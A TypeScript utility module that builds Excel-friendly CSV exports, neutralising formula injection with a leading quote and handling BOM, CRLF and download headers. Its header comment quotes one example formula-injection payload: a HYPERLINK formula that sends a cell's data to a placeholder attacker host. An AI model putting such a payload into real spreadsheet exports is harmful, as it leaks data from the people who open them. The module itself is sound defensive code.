// CSV that Excel opens correctly and cannot be tricked into executing.
//
// TWO HAZARDS, both real, both handled here rather than at each call site.
//
// 1. CSV INJECTION (a.k.a. formula injection). Excel, LibreOffice, and Google
//    Sheets treat a cell beginning with = + - @ TAB or CR as a FORMULA. A
//    display name of `=HYPERLINK("http://evil.test?"&A1,"Click")` becomes a
//    live, clickable exfiltration link in the manager's spreadsheet — the
//    export is the attack's delivery mechanism, and the person who opens it is
//    the one who gets hurt. Every field is neutralised by prefixing a single
//    quote, which Excel strips on display but never evaluates.
//
//    This matters more here than in most apps: display names are set by Team
//    Leads on accounts they create, and the audit log is read by the very
//    people with the most authority.
//
// 2. UTF-8 IN EXCEL. Excel on Windows assumes the system codepage unless the
//    file opens with a UTF-8 byte-order mark. Without it, a clinician named
//    "Núñez" exports as "NÃºÃ±ez". The BOM is what makes this genuinely
//    "opens in Excel" rather than "is technically a CSV".

const NEEDS_QUOTING = /[",\n\r]/;
// The characters a spreadsheet reads as "this cell is a formula".
const FORMULA_LEAD = /^[=+\-@\t\r]/;

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  let s = String(value);

  // Neutralise before quoting: a leading quote must end up INSIDE the quoted
  // field, not outside it.
  if (FORMULA_LEAD.test(s)) s = `'${s}`;

  if (NEEDS_QUOTING.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

export function csvRow(cells: readonly unknown[]): string {
  return cells.map(csvCell).join(",");
}

/**
 * Build a complete CSV document.
 *
 * CRLF line endings, because that is what RFC 4180 specifies and what Excel
 * expects; a bare LF file opens as one long row in some Excel versions.
 */
export function toCsv(headers: readonly string[], rows: readonly (readonly unknown[])[]): string {
  return [csvRow(headers), ...rows.map(csvRow)].join("\r\n") + "\r\n";
}

/** UTF-8 BOM. Prepended so Excel reads accented characters correctly. */
export const BOM = "﻿";

/**
 * A filename-safe, sortable stamp. Colons are illegal in Windows filenames and
 * silently mangle a download, so the ISO string is flattened.
 */
export function fileStamp(now: Date): string {
  return now.toISOString().replace(/[:.]/g, "-").slice(0, 19);
}

export interface CsvFile {
  body: string;
  filename: string;
}

export function csvFile(
  basename: string,
  headers: readonly string[],
  rows: readonly (readonly unknown[])[],
  now: Date
): CsvFile {
  return {
    body: BOM + toCsv(headers, rows),
    filename: `smile-notes-${basename}-${fileStamp(now)}.csv`
  };
}

/** Headers that make a browser download the response instead of rendering it. */
export function csvHeaders(filename: string): Record<string, string> {
  return {
    "content-type": "text/csv; charset=utf-8",
    // The quoted filename survives spaces; the ASCII-only name we generate
    // needs no RFC 5987 encoding.
    "content-disposition": `attachment; filename="${filename}"`,
    // An export is a point-in-time snapshot of privileged data. It must not sit
    // in a shared-workstation cache for the next person.
    "cache-control": "no-store, max-age=0"
  };
}
